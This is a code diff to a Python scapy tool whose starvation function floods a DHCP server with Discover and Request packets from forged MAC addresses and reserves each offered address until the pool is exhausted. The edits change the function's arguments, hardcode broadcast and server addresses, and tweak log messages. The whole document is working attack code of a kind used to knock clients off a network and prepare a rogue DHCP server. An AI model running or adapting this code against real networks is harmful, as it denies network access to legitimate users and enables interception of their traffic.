@@ -13,10 +13,12 @@ import fct_responder
 import scapy.all as scapy
 import time
 
-def starvation(free_ip, interface):
+def starvation(free_ip, args):
 
     reserved_IP = []
     nok = 0
+
+    print(f"\n{Blue}[MODE]{White} Starvation IP address...")
 
     while nok < 5:
         
@@ -27,7 +29,7 @@ def starvation(free_ip, interface):
 
         # DHCP Discover
         sniff_packet = fct_dhcp.listener(mac)
-        fct_dhcp.discover(mac, hostname, xid, interface)
+        fct_dhcp.discover("ff:ff:ff:ff:ff:ff", "255.255.255.255", mac, "0.0.0.0", hostname, xid, args)
         # DHCP Offer
         dhcp_offer = fct_dhcp.listener_join(sniff_packet)
         try:
@@ -35,7 +37,7 @@ def starvation(free_ip, interface):
             if offer_ip:
                 # DHCP Request
                 sniff_packet = fct_dhcp.listener(mac)
-                fct_dhcp.request(dst_mac, offer_ip, hostname, xid, interface)
+                fct_dhcp.request("ff:ff:ff:ff:ff:ff", "255.255.255.255", mac, "0.0.0.0", hostname, xid, "192.168.30.254", offer_ip, args)
                 # DHCP Ack
                 dhcp_ack = fct_dhcp.listener_join(sniff_packet)
                 ack_mac, ack_ip = fct_dhcp.get_ack_information(dhcp_ack)
@@ -55,6 +57,6 @@ def starvation(free_ip, interface):
         time.sleep(1)
     
     # End of DHCP Starvation
-    print(f"{Blue}[MODE]{White} Listening network...")
+    print(f"\n{Blue}[MODE]{White} Listening network...")
 
     return reserved_IP
